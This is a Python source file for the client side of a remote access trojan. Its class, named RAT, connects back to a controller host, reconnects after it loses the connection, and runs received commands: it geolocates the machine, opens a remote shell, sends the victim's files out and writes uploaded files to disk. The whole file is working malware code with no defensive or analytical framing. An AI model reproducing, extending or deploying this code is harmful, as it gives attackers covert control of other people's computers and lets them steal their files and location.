import time
import socket

from client.plugins import get_geolocate, shell, download


class RAT:
    host: str
    port: int
    s: socket.socket
    connected: bool

    def __init__(self, host: str = '127.0.0.1', port: int = 9999):
        self.host = host
        self.port = port
        self.connected = False
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def run(self) -> None:
        try:
            self.__create_connection()
            self.__handler()
        except Exception as err:
            print(f'\n Error to connection {self.host}', err, '\n Retry .....')
            time.sleep(2)
            self.run()

    def __create_connection(self) -> None:
        self.s.connect((self.host, self.port))
        self.connected = True

    def __handler(self) -> None:
        while True:
            try:
                command = self.s.recv(20480).decode()

                if command == 'geolocate':
                    get_geolocate(conn=self.s)

                elif command == 'shell':
                    shell(conn=self.s)

                elif command[:8] == 'download':

                    download(filename=command.split(" ")[1], conn=self.s)

                elif command == 'upload':
                    filename = self.s.recv(6000)
                    newfile = open(filename, 'wb')
                    data = self.s.recv(6000)
                    newfile.write(data)
                    newfile.close()

                else:
                    self.s.send(' '.encode())

            except Exception as err:
                print(f'\n Error to connection {self.host}', err, '\n Retry .....')

                self.connected = False
                self.s = socket.socket()
                print("connection lost... reconnecting")

                while not self.connected:
                    try:
                        self.s.connect((self.host, self.port))
                        self.connected = True
                        print("re-connection successful")
                    except socket.error:
                        time.sleep(2)
